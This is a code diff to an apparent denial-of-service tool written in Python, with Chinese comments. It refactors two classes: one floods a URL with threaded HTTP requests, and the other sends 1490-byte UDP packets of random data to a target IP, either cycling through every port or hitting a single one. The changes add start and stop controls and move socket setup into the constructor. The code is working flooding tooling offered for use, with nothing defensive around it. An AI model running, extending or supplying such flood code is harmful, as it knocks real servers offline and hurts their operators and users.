@@ -31,10 +31,16 @@ class Attack:
                 # 发送失败
                 self.collector['err'] += self.speed - i
                 break
-    def startattack(self):
-        while True:
+    def attackRun(self):
+        while self.start:
             t = threading.Thread(target=self.attack, args=())
             t.start()
+    def run(self):
+        self.start = True
+        t = threading.Thread(target=self.attackRun, args=())
+        t.start()
+    def stop(self):
+        self.start = False
     def __init__(self, url, speed, headers=headers):
         self.url = url
         self.speed = speed
@@ -47,25 +53,31 @@ class Attack:
 
 class Ddos:
     # 泛洪攻击
-    def all(self):
+    def allRun(self):
         self.data['port'] = self.port
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        while True:
-            sock.sendto(bytes, (self.ip,self.data['port']))
+        while self.start:
+            self.sock.sendto(self.bytes, (self.ip,self.data['port']))
             self.data['sent'] += 1
             self.data['port'] += 1
             if self.data['port'] == 65534:
                 self.data['port'] = 1
+    def all(self):
+        self.start = True
+        t = threading.Thread(target=self.allRun, args=())
+        t.start()
     # 洪攻击
-    def one(self):
+    def oneRun(self):
         self.rport = self.port
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        
-        while True:
-            sock.sendto(bytes, (self.ip,self.port))
+        while self.start:
+            self.sock.sendto(self.bytes, (self.ip,self.port))
             self.data['sent'] += 1
+    def one(self):
+        self.start = True
+        t = threading.Thread(target=self.oneRun, args=())
+        t.start()
+    # 停止攻击
+    def stop(self):
+        self.start = False
     def __init__(self, ip, port = 1):
         self.sent = 0
         self.ip = ip
@@ -74,6 +86,9 @@ class Ddos:
             "sent": 0,
             "port": 0,
         }
+        #初始化数据包
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.bytes = random._urandom(1490)
 
 
 
